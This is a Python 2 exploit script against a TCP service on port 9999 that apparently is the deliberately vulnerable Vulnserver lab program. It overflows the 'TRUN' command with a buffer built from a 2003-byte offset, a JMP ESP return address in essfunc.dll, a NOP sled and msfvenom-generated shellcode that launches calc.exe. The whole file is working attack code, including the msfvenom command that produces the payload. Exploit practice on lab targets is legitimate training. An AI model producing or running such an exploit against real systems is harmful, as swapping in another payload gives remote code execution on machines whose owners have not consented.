#!/usr/bin/python 

import socket,sys

if len(sys.argv) < 2:
    print 'Pass target IP as param'
    quit()

address = sys.argv[1]
port = 9999
badchars = "C" * 493
# offset is 2003
# badchars: \x00
# JMP ESP found in module essfunc.dll at addres 0x625011af

# Command to generate shellcode:
# msfvenom -a x86 -p windows/exec CMD=calc.exe -f python -b '\x00' --var-name shellcode
shellcode =  ""
shellcode += "\xbe\x5f\x41\x8e\x0c\xda\xce\xd9\x74\x24\xf4\x5f"
shellcode += "\x31\xc9\xb1\x31\x31\x77\x13\x83\xc7\x04\x03\x77"
shellcode += "\x50\xa3\x7b\xf0\x86\xa1\x84\x09\x56\xc6\x0d\xec"
shellcode += "\x67\xc6\x6a\x64\xd7\xf6\xf9\x28\xdb\x7d\xaf\xd8"
shellcode += "\x68\xf3\x78\xee\xd9\xbe\x5e\xc1\xda\x93\xa3\x40"
shellcode += "\x58\xee\xf7\xa2\x61\x21\x0a\xa2\xa6\x5c\xe7\xf6"
shellcode += "\x7f\x2a\x5a\xe7\xf4\x66\x67\x8c\x46\x66\xef\x71"
shellcode += "\x1e\x89\xde\x27\x15\xd0\xc0\xc6\xfa\x68\x49\xd1"
shellcode += "\x1f\x54\x03\x6a\xeb\x22\x92\xba\x22\xca\x39\x83"
shellcode += "\x8b\x39\x43\xc3\x2b\xa2\x36\x3d\x48\x5f\x41\xfa"
shellcode += "\x33\xbb\xc4\x19\x93\x48\x7e\xc6\x22\x9c\x19\x8d"
shellcode += "\x28\x69\x6d\xc9\x2c\x6c\xa2\x61\x48\xe5\x45\xa6"
shellcode += "\xd9\xbd\x61\x62\x82\x66\x0b\x33\x6e\xc8\x34\x23"
shellcode += "\xd1\xb5\x90\x2f\xff\xa2\xa8\x6d\x95\x35\x3e\x08"
shellcode += "\xdb\x36\x40\x13\x4b\x5f\x71\x98\x04\x18\x8e\x4b"
shellcode += "\x61\xd6\xc4\xd6\xc3\x7f\x81\x82\x56\xe2\x32\x79"
shellcode += "\x94\x1b\xb1\x88\x64\xd8\xa9\xf8\x61\xa4\x6d\x10"
shellcode += "\x1b\xb5\x1b\x16\x88\xb6\x09\x75\x4f\x25\xd1\x54"
shellcode += "\xea\xcd\x70\xa9"

NOP = "\x90"
CHARS_TO_OVERFLOW = "C" * (2500 - 2003 - 4 - 16 - len(shellcode))
buffer = "A" * 2003 + "\xaf\x11\x50\x62" + NOP * 16 + shellcode + CHARS_TO_OVERFLOW

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
        s.send('TRUN /.:/' + buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
